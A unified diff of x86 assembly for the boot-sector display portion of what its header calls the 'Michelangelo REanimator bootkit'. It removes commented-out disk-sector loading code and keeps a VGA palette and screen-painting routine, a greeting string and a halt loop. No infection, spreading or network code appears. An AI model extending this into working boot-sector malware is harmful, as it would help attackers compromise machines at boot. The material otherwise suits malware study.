@@ -2,7 +2,6 @@
 ;.286			;masm specific
 ;.MODEL TINY		;masm specific
 
-
 ;******************************************************************************
 ;	This is the working demo of part of the malicious MBR/boot sector portion
 ; 	of the Michelangelo REanimator bootkit
@@ -33,75 +32,20 @@
 ;******************************************************************************
 
 ;.CODE:
-;org 0x7C00
 
 ;******************************************************************************
-;SCREEN_MAX			equ	320*200
 SCREEN_WIDTH		equ	0x140							;;320
-;SCREEN_HEIGHT		equ	0xC8							;;200
-;SCALED_SCREEN_MAX	equ	0x280*SCALE_MULTIPLIER
 SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
 SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
 SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
 OFFSET_SCREEN_H		equ SCALED_SCREEN_H*SCREEN_WIDTH
-;MBRSPRITE_W			equ	0x10							;;256
-;MBRSPRITE_AREA		equ	0x7D00							;;320 / * MBRSPRITE_W
-;NEWSPRITE_AREA		equ	0x2800*SCALE_MULTIPLIER			;;320 / * MBRSPRITE_W
 NEWSPRITE_AREA		equ	0x2800
-;MBR_SIZE			equ 0x200
 SCALE_MULTIPLIER	equ 4
 
 VGA_PAL_INDEX		equ	0x3C8
 VGA_PAL_DATA		equ	0x3C9
 ;******************************************************************************
-;
-;VX_BOOT:
-;cli
-;xor 	ax,ax
-;mov 	ds,ax
-;mov 	es,ax
-;mov 	ss,ax
-;mov		ax, 0x7C00
-;mov		sp, ax
-;sti
-;
-;load_vx_paint:
-;	mov ax, 0x0		;reset disk
-;	int 13h
-;
-;	push cs
-;	pop es
-;	push cs
-;	pop ds
-;	
-;	mov cx, 0x14
-;	push cx
-;	mov si, 0xD
-;	mov di, 0x600
-;	read_sector:
-;		mov ax, 0x201	;read twenty sectors of disk, but one at a time bb
-;		mov ch, 0
-;		mov	cl, [si]	;cylinder 0, sector 13 (0xD)
-;		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
-;		mov bx, [VXPaintBuffer]		;to buffer BUF in DS
-;		int 13h
-;		
-;		lea si, [bx]
-;		mov cx, 0x100
-;		repnz movsw
-;		
-;	add di, 512
-;	inc si
-;	pop cx
-;	dec cx
-;	jnz read_sector
-;
-	
-;******************************************************************************
-;org 0x600 
 org 0x0 
-
-;jmp VXPaintBuffer
 
 vga_init:
 ;;*here	pop si
@@ -169,71 +113,44 @@ set_pal:
 paint_setup:
 ;*here*	pop si
 	;push si
-;	mov cx, 8
 	mov	cx, SCALED_SCREEN_W
 	shr cx, 2
-;	shl cx, 1
 	xor di, di
 	paint_loop:
 		push 	di
 		push	cx
 		mbr_paint:
-			;pop si
-			;lea si, MichelAngeBitmap
-			;mov si, $-VXPaintBuffer+3
 			lea si, $-VXPaintBuffer+3
-			
 			push si
 			push cs
 			pop ds
 			
-			;mov ax, 0x07e0
-			;mov ds, ax
-			;xor si, si
-			
-			;mov si, 0x7E00
-			;lea si, VXPaintBuffer
-			;lea si, VXPaintBuffer
-			;mov si, 0x600
-			;mov si, 0x200
 			mov bx, SCALED_SCREEN_MAX
 			vga_mbr_y:
 				push di
 				mov dx, SCALED_SCREEN_W
 				vga_mbr_x:
 					mov ax, ds:[si]
-					;mov ax, [si]
 					or al, es:[di]
 					add al, 0x01
 					;add al, [randtimer]
 					;add al, [randshiftnum]
 					mov es:[di], al 
-					;;mov es:[di], ah
-					;;mov es:[di+2], al 
 					inc si
 					inc di
-					;;add di, 4
 					dec dx
 					jnz vga_mbr_x
-				;add si, 128
 				pop di
-				;add di, 320
 				;add di, OFFSET_SCREEN_H
 				add di, SCREEN_WIDTH
 				dec bx
 				jnz vga_mbr_y
 			pop si
-			;add si, 128
-			;push si
-			;add si, 320
-			;add si, 256
 		pop		cx
 		pop 	di
-		;add		di, SCALED_SCREEN_W
 		add		di, NEWSPRITE_AREA
 		dec 	cx
 		jnz	paint_loop
-
 
 rsvp:
 	mov cx, greetz_len
@@ -249,22 +166,6 @@ welcome:
 	inc si
 	dec cx
 	jnz welcome
-	jmp key_check
-
-randtimercheck:
-	mov cx, 2
-	mov si, randtimer
-	push cs
-	pop ds
-randtimerprint:
-	mov al, [si]
-	mov bh, 0
-	mov bl, 0x0F
-	mov ah, 0x0E
-	int 0x10
-	inc si
-	dec cx
-	jnz randtimerprint
 	jmp key_check
 
 ;******************************************************************************
@@ -283,14 +184,13 @@ key_check:
 	jnz	baibai
 ;******************************************************************************
 ;
-;	Terminates program (function 4Ch,int21h)
+;	hlt infinite loop
+;	xoxo
 ;
 ;******************************************************************************
 baibai:
 	hlt	
 	jmp baibai
-	;mov	ax,4C00h		;terminate program
-	;int	21h
 
 greetz:
 	db "u know u luv me", 0Dh, 0Ah
@@ -307,21 +207,9 @@ randshift0:
 	db 0
 
 randshift1 equ (randshift0 - 2)
-
-;VXPaintBuffer: 
-;call vga_init
-;db 'AAAAA'
 	
 VXend:
 	times 512-($-$$) db 0
-;	db 0x55
-;	db 0xAA
-
-
-;VXPaintBuffer: 
-;call vga_init
-;db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-
 
 VXPaintBuffer: 
 call vga_init
